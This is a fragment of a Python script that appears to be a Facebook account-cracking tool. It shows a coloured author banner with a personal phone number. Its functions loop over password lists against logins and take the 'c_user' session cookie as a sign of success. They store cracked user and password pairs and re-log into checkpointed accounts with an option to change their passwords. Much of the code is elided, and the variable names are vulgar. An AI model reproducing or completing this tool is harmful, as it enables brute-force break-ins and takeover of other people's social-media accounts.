...
\033[1;92m╔═════════════════════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m Istiak Risat        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m 01914823938         \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Fb  :  \033[1;92m NO PUBLIC    \033[1;31;1m        █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 1.0                 \033[1;31;1m █
\033[1;92m╚═════════════════════════════════════════╝""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}risat123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[RISAT-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[RISAT-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[RISAT-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
